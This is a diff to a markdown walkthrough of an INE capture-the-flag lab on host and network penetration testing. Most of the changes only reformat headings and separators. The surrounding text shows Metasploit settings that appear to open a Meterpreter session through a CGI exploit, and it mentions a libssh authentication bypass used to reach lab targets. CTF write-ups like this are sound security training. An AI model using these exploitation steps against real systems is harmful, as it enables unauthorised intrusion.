@@ -1,4 +1,5 @@
 ## Host & Network Penetration Testing: System-Host Based Attacks CTF 2
+
 ### Flag 1: Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local
 
 We begin with an Nmap scan across all ports, which reveals that only port 80 is open
@@ -31,17 +32,20 @@ setg TARGETURI /browser.cgi
 setg LHOST 192.164.224.2 
 run
 ```
-**Note: If something is not working, try selecting another LPORT.**
+***Note: If something is not working, try selecting another LPORT.***
 
 We obtain a Meterpreter session and start exploring the target server, finding .flag.txt as our second flag.
 Navigating to the root directory, we locate the first flag.
+
+***
 
 ### Flag 2: In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.
 
 This flag is found during the previous step.
 
+***
 
-## Flag 3: Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.
+### Flag 3: Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.
 
 Analyzing target 2, we scan it with Nmap. The scan leads us to port 22 and its service, libssh 0.8.3.
 
@@ -73,6 +77,7 @@ sessions -i 1
 
 Navigating to the home folder of the user, we locate the third flag.
 
+***
 
 ### Flag 4: The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.
 
